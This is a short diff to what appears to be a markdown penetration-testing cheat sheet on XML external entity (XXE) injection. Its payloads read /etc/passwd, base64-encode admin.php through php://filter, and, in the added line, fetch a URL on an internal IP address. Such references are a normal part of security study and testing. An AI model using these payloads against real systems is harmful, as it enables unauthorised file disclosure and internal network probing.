@@ -126,6 +126,7 @@
 * Call the external entity with `&sp;`
 * `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "file:///etc/passwd">]>`
 * `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">]>`
+* `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "http://192.168.140.135/robots.txt">]>`
 
 ## Methodology
 From "The Web Application Hacker's Handboook"
